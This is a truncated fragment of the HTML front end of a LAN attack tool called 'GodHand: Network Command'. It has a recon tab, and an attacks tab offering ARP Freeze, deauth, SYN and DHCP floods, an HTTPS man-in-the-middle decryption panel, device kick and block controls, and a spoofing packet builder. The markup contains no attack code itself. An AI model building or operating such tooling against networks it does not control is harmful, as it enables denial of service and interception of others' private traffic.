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" alt="GodHand">
    <span>GodHand: Network Command</span>
  </a>
  <button class="btn-icon" id="logout-btn" onclick="handleLogout()" title="Log out" style="display:none; margin-left:4px;">
    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
  </button>
  <div class="status-indicator" id="global-status">
    <span class="status-dot" id="status-dot"></span>
    <span id="status-text">Ready</span>
  </div>
</header>

<nav id="main-nav">
  <button class="tab-btn active" data-tab="settings"><span class="icon"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg></span> Settings</button>
  <button class="tab-btn" data-tab="gateway"><span class="icon"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg></span> Gateway</button>
  <button class="tab-btn" data-tab="recon"><span class="icon"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></span> Recon</button>
  <button class="tab-btn" data-tab="attacks"><span class="icon"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><circle cx="12" cy="12" r="6"></circle><circle cx="12" cy="12" r="2"></circle></svg></span> Attacks</button>
  <button class="tab-btn" data-tab="monitor"><span class="icon"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg></span> Monitor</button>
  <button class="tab-btn" data-tab="https"><span class="icon"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><line x1="12" y1="12" x2="12" y2="12.01"></line></svg></span> HTTPS</button>
</nav>

<main>
  <div id="tab-settings" class="tab-content active">
    <div id="root-warning" class="status-message" style="display:none; border-left-color:var(--danger);">
      <strong>Not running as root.</strong> Recon scanning, ARP Freeze, Deauth Flood, SYN Flood, DHCP Storm, and Traffic Capture all need raw sockets (and <code>iw</code>/<code>iptables</code> for some), which require root. Run this with <code>sudo</code> (or as root in Termux) or these will fail.
    </div>
    <div class="card">
      <h2>Interface & gateway</h2>
      <p class="sub">Start here — set your Wi‑Fi interface and gateway IP before scanning or attacking.</p>
      <div class="row">
        <select id="iface-select"></select>
        <button class="btn" onclick="setInterface()">Set interface</button>
      </div>
      <div class="row">
        <input type="text" id="gateway-input" placeholder="Gateway IP">
        <button class="btn" onclick="setGateway()">Set gateway</button>
      </div>
      <div class="row">
        <input type="number" id="port-input" placeholder="Port (1-65535)" value="80">
        <button class="btn" onclick="setPort()">Set port</button>
      </div>
      <div id="settings-status" class="status-message">Current: IFACE: none, GW: none, PORT: 80</div>
    </div>
    <div class="card">
      <h2>Live bandwidth</h2>
      <p class="sub">Throughput on the selected interface, sampled every 2s.</p>
      <div class="bw-legend">
        <span class="bw-key"><span class="bw-swatch" style="background:var(--accent-primary);"></span>Download <strong id="bw-rx">—</strong></span>
        <span class="bw-key"><span class="bw-swatch dash" style="background:var(--warning);"></span>Upload <strong id="bw-tx">—</strong></span>
      </div>
      <svg id="bw-spark" viewBox="0 0 300 56" preserveAspectRatio="none" class="sparkline">
        <polyline id="bw-spark-rx" points=""></polyline>
        <polyline id="bw-spark-tx" points=""></polyline>
      </svg>
      <div class="empty" id="bw-empty">Set an interface above to see live throughput.</div>
    </div>
  </div>

  <div id="tab-gateway" class="tab-content">
    <div class="card">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; flex-wrap:wrap; gap:8px;">
        <h2 style="margin:0;">Privacy DNS stack</h2>
        <span id="gw-dns-badges"></span>
      </div>
      <p class="sub">Unbound (DNSSEC, port 5335) forwards to DNSCrypt-proxy (encrypted upstream + ad/tracker/malware blocklist). Self-contained — no dependency on any pre-existing setup.</p>
      <div class="row">
        <button class="btn" onclick="startGatewayDns()">Start DNS stack</button>
        <button class="btn secondary" onclick="stopGatewayDns()">Stop</button>
        <button class="btn secondary" onclick="updateGatewayBlocklist()">Update blocklist</button>
        <button class="btn secondary" onclick="testGatewayDns()">Test resolution</button>
      </div>
      <div id="gw-dns-status" class="status-message">Blocklist: 0 domain(s) loaded.</div>
      <div id="gw-dns-test-result"></div>
    </div>
    <div class="card">
      <h2>VPN</h2>
      <p class="sub">Detects an active WireGuard, OpenVPN, or Cloudflare tunnel. GodHand doesn't provision VPN credentials for you — set one up separately and it'll show as active here.</p>
      <div id="gw-vpn-status" class="status-message">Checking...</div>
    </div>
    <div class="card">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; flex-wrap:wrap; gap:8px;">
        <h2 style="margin:0;">Network-wide proxy</h2>
        <span id="gw-proxy-badge"></span>
      </div>
      <p class="sub">An HTTP/HTTPS proxy other devices on your LAN can point to.</p>
      <div class="row">
        <button class="btn" onclick="startGatewayProxy()">Start proxy</button>
        <button class="btn secondary" onclick="stopGatewayProxy()">Stop</button>
      </div>
      <div id="gw-proxy-status" class="status-message">Not running.</div>
    </div>
    <div class="card">
      <h2>Configure other devices</h2>
      <p class="sub">Point devices on your network at this host to route them through the stack above — no router admin access required.</p>
      <div class="status-message">
        <div>Local IP: <strong id="gw-local-ip">—</strong></div>
        <div>External IP: <strong id="gw-external-ip">—</strong></div>
        <div>DNS server: <strong id="gw-dns-target">—</strong></div>
        <div>HTTP proxy: <strong id="gw-proxy-target">—</strong></div>
      </div>
    </div>
    <div class="card">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; flex-wrap:wrap; gap:8px;">
        <h2 style="margin:0;">Dynamic DNS</h2>
        <span id="ddns-badge"></span>
      </div>
      <p class="sub">Keep a hostname pointed at this network's current public IP — DuckDNS or No-IP.</p>
      <details style="margin-bottom:14px;">
        <summary style="cursor:pointer; color:var(--text-secondary); font-size:0.85rem;">How to set this up, and which variables you need</summary>
        <div style="margin-top:10px; font-size:0.85rem; color:var(--text-secondary); line-height:1.6;">
          <p style="margin-bottom:8px;"><strong style="color:var(--text-primary);">DuckDNS:</strong>
            Sign in free at <span style="font-family:'JetBrains Mono',monospace;">duckdns.org</span>, add a subdomain
            (e.g. <span style="font-family:'JetBrains Mono',monospace;">pet-my</span> → pet-my.duckdns.org), then copy the
            token shown on that page. Enter the subdomain and token below, Save, then turn on auto-update.</p>
          <p style="margin-bottom:8px;"><strong style="color:var(--text-primary);">No-IP:</strong>
            Create a free hostname at <span style="font-family:'JetBrains Mono',monospace;">noip.com</span>
            (e.g. sucka.sytes.net), then enter that full hostname plus your No-IP account username and password below.
            Free No-IP hostnames must be confirmed by email every 30 days or they expire.</p>
          <p style="margin-bottom:0;"><strong style="color:var(--text-primary);">To survive restarts:</strong>
            settings saved below only live in memory — they're gone the next time GodHand restarts (phone reboot,
            Termux getting killed, etc.). Set these environment variables before launching instead, and this panel
            will load and enable them automatically on every start:</p>
          <pre style="margin:8px 0 0; padding:10px 12px; background:var(--bg-inset); border:1px solid var(--border-subtle); border-radius:8px; font-family:'JetBrains Mono',monospace; font-size:0.78rem; white-space:pre-wrap; color:var(--text-primary);">GODHAND_DDNS_PROVIDER=duckdns          # or: noip
GODHAND_DDNS_DOMAIN=pet-my              # or a full No-IP hostname
GODHAND_DDNS_TOKEN=&lt;duckdns token&gt;      # DuckDNS only
GODHAND_DDNS_USERNAME=&lt;no-ip username&gt; # No-IP only
GODHAND_DDNS_PASSWORD=&lt;no-ip password&gt; # No-IP only
GODHAND_DDNS_INTERVAL_MINUTES=5         # optional, default 5
GODHAND_DDNS_ENABLED=1                  # optional, default on when the above are set</pre>
        </div>
      </details>
      <div class="row">
        <select id="ddns-provider" onchange="onDdnsProviderChange()">
          <option value="duckdns">DuckDNS</option>
          <option value="noip">No-IP</option>
        </select>
        <input type="text" id="ddns-domain" placeholder="Hostname (e.g. pet-my, or sucka.sytes.net for No-IP)">
      </div>
      <div class="row" id="ddns-duckdns-fields">
        <input type="text" id="ddns-token" placeholder="DuckDNS token">
      </div>
      <div class="row" id="ddns-noip-fields" style="display:none;">
        <input type="text" id="ddns-username" placeholder="No-IP username">
        <input type="password" id="ddns-password" placeholder="No-IP password">
      </div>
      <div class="row">
        <input type="number" id="ddns-interval" value="5" min="1" placeholder="Update every N minutes">
        <button class="btn secondary" onclick="saveDdnsConfig()">Save</button>
        <button class="btn secondary" onclick="ddnsUpdateNow()">Update now</button>
      </div>
      <label class="row" style="align-items:center; cursor:pointer;">
        <input type="checkbox" id="ddns-enabled" onchange="toggleDdnsEnabled()">
        Auto-update on the interval above
      </label>
      <div id="ddns-status" class="status-message">Not configured.</div>
    </div>
    <div class="card">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; flex-wrap:wrap; gap:8px;">
        <h2 style="margin:0;">Remote tunnel (ngrok)</h2>
        <span id="ngrok-badge"></span>
      </div>
      <p class="sub">Reach this UI from outside your network without router port-forwarding — useful when your ISP has locked down admin access to your own gateway.</p>
      <div class="row">
        <input type="text" id="ngrok-authtoken" placeholder="ngrok authtoken (leave blank if already configured)">
      </div>
      <div class="row">
        <button class="btn" onclick="startNgrok()">Start tunnel</button>
        <button class="btn secondary" onclick="stopNgrok()">Stop</button>
      </div>
      <div id="ngrok-status" class="status-message">Not running.</div>
    </div>
  </div>

  <div id="tab-recon" class="tab-content">
    <div class="card">
      <h2>Discover & target hosts</h2>
      <p class="sub">Scan the LAN, then select hosts to target — or add an IP directly if it wasn't discovered.</p>
      <div class="row">
        <button class="btn" id="scan-btn" onclick="refreshHosts()"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-3px; margin-right:4px;"><polyline points="23 4 23 10 17 10"></polyline><polyline points="1 20 1 14 7 14"></polyline><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path></svg>Scan now</button>
        <button class="btn secondary" onclick="bulkAddTargets()">Add selected to targets</button>
        <button class="btn secondary" onclick="addSelectedToWatch()">Add selected to watch</button>
        <span id="scan-spinner" style="display:none;"><span class="spinner"></span> Scanning...</span>
      </div>
      <div class="row">
        <input type="text" id="target-ip" placeholder="Add IP manually" style="flex-basis:100%;">
      </div>
      <div class="row">
        <button class="btn secondary" onclick="addTarget()">Add target</button>
        <button class="btn secondary" onclick="kickTypedIP()"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-3px; margin-right:4px;"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="8.5" cy="7" r="4"></circle><line x1="18" y1="8" x2="23" y2="13"></line><line x1="23" y1="8" x2="18" y2="13"></line></svg>Kick</button>
        <button class="btn secondary" onclick="blockTypedIP()"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-3px; margin-right:4px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>Block</button>
      </div>
      <p class="sub" style="margin-top:-8px;">Kick/Block act on the typed IP directly — no need to add it as a target first.</p>
      <p class="sub" style="margin-bottom:8px;">Current targets — attacks run against these:</p>
      <div class="chip-row" id="target-chips"></div>
      <div class="table-responsive">
        <table id="host-table">
          <thead><tr><th><input type="checkbox" id="select-all-hosts" onchange="toggleAllHosts()"></th><th>IP</th><th>MAC</th><th>Reachability</th><th>Action</th></tr></thead>
          <tbody id="host-body"></tbody>
        </table>
      </div>
      <div class="empty" id="host-empty">No hosts discovered. Press "Scan now".</div>
    </div>
    <div class="card">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
        <h2 style="margin:0;">Tracked devices</h2>
        <button class="btn secondary" onclick="checkAllDevices()">Check all</button>
      </div>
      <p class="sub">Watch specific hosts long-term, independent of scan results — or watch every host on the network.</p>
      <div class="row">
        <input type="text" id="dev-name" placeholder="Label">
        <input type="text" id="dev-ip" placeholder="IP address">
        <button class="btn" onclick="addDevice()">Add</button>
      </div>
      <label class="row" style="align-items:center; cursor:pointer;">
        <input type="checkbox" id="watch-whole-network" onchange="toggleWatchWholeNetwork()">
        Watch the whole network (auto-add every host found by a scan)
      </label>
      <div class="table-responsive">
        <table id="dev-table">
          <thead><tr><th>Label</th><th>IP</th><th>Status</th><th>Latency</th><th></th></tr></thead>
          <tbody></tbody>
        </table>
      </div>
      <div class="empty" id="dev-empty">No devices yet. Add one above.</div>
    </div>
  </div>

  <div id="tab-attacks" class="tab-content">
    <div class="card">
      <h2>Choose your weapon</h2>
      <p class="sub">Select an attack, make sure targets are set on the Recon tab, then press Start.</p>
      <div class="weapon-grid" id="weapon-grid">
        <div class="weapon-btn active" data-w="1"><span class="num">1</span><span class="label">ARP Freeze</span></div>
        <div class="weapon-btn" data-w="2"><span class="num">2</span><span class="label">Deauth Flood</span></div>
        <div class="weapon-btn" data-w="3"><span class="num">3</span><span class="label">SYN Flood</span></div>
        <div class="weapon-btn" data-w="4"><span class="num">4</span><span class="label">DHCP Storm</span></div>
        <div class="weapon-btn" data-w="5"><span class="num">5</span><span class="label">Traffic Capture</span></div>
      </div>
      <div id="deauth-capability" class="status-message">Deauth method: checking...</div>
      <div id="syn-flood-capability" class="status-message">SYN Flood method: checking...</div>
      <div style="display:flex; gap:10px; flex-wrap:wrap;">
        <button class="btn big" id="start-btn" onclick="confirmStartAttack()">▶ Start</button>
        <button class="btn big secondary" id="stop-btn" onclick="confirmStopAttack()" disabled>⏹ Stop</button>
      </div>
      <div id="attack-status" class="status-message">Status: Ready</div>
    </div>
    <div class="card">
      <h2>HTTPS Interception (Phase 1.5)</h2>
      <p class="sub">Transparent MITM proxy for HTTPS traffic inspection. Intercept, decrypt, and monitor all HTTPS traffic from configured devices. Configure devices via <code>pac.installCA.lan</code> to use as proxy.</p>
      <div style="display:flex; gap:10px; flex-wrap:wrap;">
        <button class="btn" id="https-start-btn" onclick="httpsInterceptStart()">🔒 Start Interception</button>
        <button class="btn secondary" id="https-stop-btn" onclick="httpsInterceptStop()" disabled>⏹ Stop Interception</button>
      </div>
      <div id="https-status" class="status-message">Status: Not running</div>
      <div style="margin-top:15px; padding:10px; background:rgba(100,100,100,0.15); border-radius:4px; font-size:0.9rem;">
        <strong>Live Traffic:</strong>
        <div style="margin-top:10px; max-height:400px; overflow-y:auto; border:1px solid rgba(255,255,255,0.1); border-radius:3px; background:rgba(0,0,0,0.2);">
          <table id="https-traffic-table" style="width:100%; font-size:0.85rem; border-collapse:collapse;">
            <thead style="position:sticky; top:0; background:rgba(0,0,0,0.4);">
              <tr>
                <th style="padding:8px; text-align:left; border-bottom:1px solid rgba(255,255,255,0.1);">Timestamp</th>
                <th style="padding:8px; text-align:left; border-bottom:1px solid rgba(255,255,255,0.1);">Type</th>
                <th style="padding:8px; text-align:left; border-bottom:1px solid rgba(255,255,255,0.1);">Hostname</th>
                <th style="padding:8px; text-align:left; border-bottom:1px solid rgba(255,255,255,0.1);">Method/Status</th>
                <th style="padding:8px; text-align:left; border-bottom:1px solid rgba(255,255,255,0.1);">Client IP</th>
              </tr>
            </thead>
            <tbody id="https-traffic-tbody">
            </tbody>
          </table>
        </div>
        <div id="https-traffic-empty" style="padding:20px; text-align:center; color:#999;">No traffic captured yet</div>
      </div>
      <div style="margin-top:10px;">
        <label style="display:flex; align-items:center; gap:8px; cursor:pointer; font-size:0.9rem;">
          <input type="text" id="https-filter" placeholder="Filter by hostname (e.g., example.com)" style="flex:1; padding:6px;">
          <button class="btn small" onclick="httpsFilterTraffic()">Filter</button>
        </label>
      </div>
    </div>
    <div class="card">
      <h2>Live traffic capture</h2>
      <p class="sub">Weapon 5 output — see the <strong>Monitor</strong> tab for the full capture &amp; analysis panel (top talkers, ports, live feed).</p>
      <div id="attacks-traffic-status" class="status-message">Not capturing.</div>
    </div>
    <div class="card">
      <h2>Custom packet builder</h2>
      <p class="sub">Craft and send a raw Ethernet/IP frame yourself — your own MACs, IPs, ports, TCP flags, and payload. Capped at 50 sends per click; for sustained floods use the weapons above instead.</p>
      <div class="row">
        <input type="text" id="pkt-dst-ip" placeholder="Destination IP (required)">
        <input type="text" id="pkt-dst-mac" placeholder="Destination MAC (blank = auto-resolve/broadcast)">
      </div>
      <div class="row">
        <input type="text" id="pkt-src-ip" placeholder="Source IP (blank = this device)">
        <input type="text" id="pkt-src-mac" placeholder="Source MAC (blank = this device)">
      </div>
      <div class="row">
        <select id="pkt-protocol" onchange="onPacketProtocolChange()">
          <option value="tcp">TCP</option>
          <option value="udp">UDP</option>
          <option value="icmp">ICMP</option>
          <option value="raw">Raw IP</option>
        </select>
        <input type="number" id="pkt-ttl" placeholder="TTL" value="64" min="1" max="255">
      </div>
      <div class="row" id="pkt-ports-row">
        <input type="number" id="pkt-src-port" placeholder="Source port" min="0" max="65535" value="0">
        <input type="number" id="pkt-dst-port" placeholder="Destination port" min="0" max="65535" value="0">
      </div>
      <div class="row" id="pkt-tcp-flags-row">
        <label style="display:flex; align-items:center; gap:4px; cursor:pointer;"><input type="checkbox" class="pkt-flag" value="SYN" checked> SYN</label>
        <label style="display:flex; align-items:center; gap:4px; cursor:pointer;"><input type="checkbox" class="pkt-flag" value="ACK"> ACK</label>
        <label style="display:flex; align-items:center; gap:4px; cursor:pointer;"><input type="checkbox" class="pkt-flag" value="FIN"> FIN</label>
        <label style="display:flex; align-items:center; gap:4px; cursor:pointer;"><input type="checkbox" class="pkt-flag" value="RST"> RST</label>
        <label style="display:flex; align-items:center; gap:4px; cursor:pointer;"><input type="checkbox" class="pkt-flag" value="PSH"> PSH</label>
